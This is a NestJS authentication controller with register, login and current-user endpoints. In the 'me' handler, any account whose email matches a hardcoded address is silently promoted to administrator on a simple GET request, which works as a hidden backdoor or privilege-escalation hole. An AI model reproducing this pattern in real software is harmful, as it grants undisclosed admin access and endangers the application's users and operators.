import { Body, Controller, Get, Post, UseGuards } from '@nestjs/common'
import { AuthService } from './auth.service'
import { UsersService } from '../users/users.service'
import { RegisterDto } from './dto/register.dto'
import { LoginDto } from './dto/login.dto'
import { JwtAuthGuard } from '../common/guards/jwt-auth.guard'
import { CurrentUser } from '../common/decorators/current-user.decorator'
import { UserRole } from '../common/enums/role.enum'

const ADMIN_EMAIL = '123456789@list.ru'

@Controller('auth')
export class AuthController {
  constructor(private readonly authService: AuthService, private readonly usersService: UsersService) {}

  @Post('register')
  async register(@Body() dto: RegisterDto) {
    return this.authService.register(dto)
  }

  @Post('login')
  async login(@Body() dto: LoginDto) {
    return this.authService.login(dto)
  }

  @Get('me')
  @UseGuards(JwtAuthGuard)
  async me(@CurrentUser() user: { id: string; email: string; role: string }) {
    if (user.email?.toLowerCase() === ADMIN_EMAIL && user.role !== UserRole.Admin) {
      await this.usersService.updateRole(user.id, UserRole.Admin)
    }
    return this.usersService.findPublicById(user.id)
  }
}
